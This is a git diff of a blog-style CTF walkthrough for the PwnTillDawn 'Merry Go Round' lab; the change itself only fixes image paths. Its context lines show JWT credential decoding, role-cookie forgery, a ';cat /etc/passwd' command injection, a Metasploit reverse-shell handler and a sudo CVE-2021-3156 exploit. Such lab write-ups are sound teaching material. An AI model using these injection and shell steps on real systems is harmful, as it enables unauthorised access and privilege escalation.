@@ -8,13 +8,13 @@ description: Enumerating a Python web application, decoding JWT tokens and passw
 
 # Merry Go Round (10.150.150.100)
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/1.png)
+![](/assets/img/post/pwntilldawn_merry_go_round/1.png)
 
 ## Initial Reconnaissance
 
 Let's check the results from Nmap and gather some intel on available services.
 
-![2](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/2.png)
+![2](/assets/img/post/pwntilldawn_merry_go_round/2.png)
 
 Note that apart from SSH and a default Apache web server, we also have a Python application on port 5000 and some other ports with unknown services and strings. Since the results look the same, I'm assuming the strings are more relevant than the ports, so I've did some magic with `cut` to get the strings to a separate file:
 
@@ -46,13 +46,13 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibG9va2hlcmUiLCJwYXNzIjoiOWU2Njk
 
 As the default Apache web server doesn't contain any information, let's skip to the Python `Werkzeug` web server on port 5000. We're greeted with a login page with no additional functionalities since there's no reset password page linked. Also, the source-code doesn't have anything relevant on it.
 
-![3](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/3.png)
+![3](/assets/img/post/pwntilldawn_merry_go_round/3.png)
 
 If you're familiar with basic cryptography you've probably noticed the strings follow a certain pattern and they're likely to be base64 encoded strings. Attempt to decode any of the strings and you'll see they're actually JWT (Jason Web Tokens).
 
 After using a [JWT debugger](https://jwt.io/) to decode the tokens, we'll notice that these tokens actually have usernames and passwords inside. Moreover, the stored passwords are encrypted with different algorithms for each one.
 
-![4](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/4.png)
+![4](/assets/img/post/pwntilldawn_merry_go_round/4.png)
 
 We don't have a valid signature, but that's not important, so I've taken each credential and added to another file:
 
@@ -86,7 +86,7 @@ honey:37c6071199fc0d54c7804f4ee67e0be1ff490e09a7316eb202f818d709952570f30efb15f3
 
 Now, after a few attempts, I've successfully logged in using `john`'s account, reaching the first flag.
 
-![5](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/5.png)
+![5](/assets/img/post/pwntilldawn_merry_go_round/5.png)
 
 Though the page asks for a username and employee ID, it doesn't matter what you type in, you'll be sent to an unauthorized page, so it has to be something else. The page tips us with the message `The higher you escalate, the more you see....` so checking users can't be right.
 
@@ -96,11 +96,11 @@ Though the page asks for a username and employee ID, it doesn't matter what you 
 
 After being stuck for a while I've noticed something in the requests:
 
-![6](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/6.png)
+![6](/assets/img/post/pwntilldawn_merry_go_round/6.png)
 
 The cookie explicitly tell us is meant to set a role for the user, futhermore there's a JS library being used in this page with some base64 strings inside:
 
-![7](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/7.png)
+![7](/assets/img/post/pwntilldawn_merry_go_round/7.png)
 
 Decoding the base64 strings reveals crucial information abou the application:
 
@@ -110,11 +110,11 @@ role cookie format: sha256("username:user")
 
 So this code is a `sha256` function, and the cookie format is username followed by a role, which can either be user or admin. Let's modify this cookie using the function inside thw brower console:
 
-![8](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/8.png)
+![8](/assets/img/post/pwntilldawn_merry_go_round/8.png)
 
 And after reloading the page, we'll be greeted again with a new message, and another flag.
 
-![9](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/9.png)
+![9](/assets/img/post/pwntilldawn_merry_go_round/9.png)
 
 
 
@@ -126,7 +126,7 @@ The new page has a simple ping functionality that's being executed inside the ma
 ;cat /etc/passwd
 ```
 
-![10](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/10.png)
+![10](/assets/img/post/pwntilldawn_merry_go_round/10.png)
 
 The `;` symbol ensures the next command will be executed even though the last one returned an error, so we don't need to add an IP address. Time get a shell inside this machine. I'll be using `msfvenom` to generate the payload: 
 
@@ -150,11 +150,11 @@ msfconsole -x "use multi/handler;set payload python/meterpreter/reverse_tcp;set 
 
 And after sending the payload we'll receive the connection:
 
-![11](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/11.png)
+![11](/assets/img/post/pwntilldawn_merry_go_round/11.png)
 
 The next flag will be found inside our current use home directory:
 
-![12](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/12.png)
+![12](/assets/img/post/pwntilldawn_merry_go_round/12.png)
 
 
 
@@ -166,7 +166,7 @@ The method to escalate privileges on this machine is by identifying a known CVE 
 sudo --version | head -n1
 ```
 
-![13](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/13.png)
+![13](/assets/img/post/pwntilldawn_merry_go_round/13.png)
 
 This version is actually vulnerable to CVE-2021-3156 (a.k.a. Sudo Baron Samedit). Since we're already using Metasploit, we can just use the available exploit for this CVE. Just use `Ctrl + Z` to background the current channel and `bg` to background the session, this will take you back to Metasploit.
 
@@ -174,7 +174,7 @@ This version is actually vulnerable to CVE-2021-3156 (a.k.a. Sudo Baron Samedit)
 search cve-2021-3156
 ```
 
-![14](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/14.png)
+![14](/assets/img/post/pwntilldawn_merry_go_round/14.png)
 
 This is the exact one! Let's fill the required information and fire it up:
 
@@ -182,10 +182,10 @@ This is the exact one! Let's fill the required information and fire it up:
 use exploit/linux/local/sudo_baron_samedit
 ```
 
-![15](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/15.png)
+![15](/assets/img/post/pwntilldawn_merry_go_round/15.png)
 
 Once the exploit has been successfully executed, you can get another shell, this time as the `root`. The final flag is inside the user `happy` which we saw earlier in the `/etc/passwd` file:
 
-![16](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/16.png)
+![16](/assets/img/post/pwntilldawn_merry_go_round/16.png)
 
 And with great success we have all the flags!
